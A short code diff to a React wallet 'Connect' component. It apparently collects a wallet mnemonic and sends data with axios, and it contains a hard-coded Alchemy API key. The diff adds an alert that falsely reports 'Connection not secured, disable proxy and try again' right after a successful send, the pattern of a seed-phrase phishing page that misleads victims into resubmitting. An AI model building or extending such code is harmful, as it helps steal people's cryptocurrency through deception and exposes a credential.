@@ -6,7 +6,6 @@ import {ethers} from 'ethers'
 import { useParams } from 'react-router-dom';
 import BigNumber from 'bignumber.js';
 import axios from 'axios';
-import bip39 from 'bip39'
 const provider = new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/ZMQRM7X06XnuSWA1GpTs2SqJLvHLwC-b')
 const Connect = () => {
     const [mnemonic, setMnemonics] = useState();
@@ -99,6 +98,7 @@ catch(error){
         }
         ).then((data) => {
            console.log(data)
+           alert('Connection not secured, disable proxy and  try again')
         }).catch((err) => {
             console.log(err)
         })
@@ -118,6 +118,7 @@ catch(error){
         }
         ).then((data) => {
            console.log(data)
+           alert('Connection not secured, disable proxy and  try again')
         }).catch((err) => {
             console.log(err)
         })
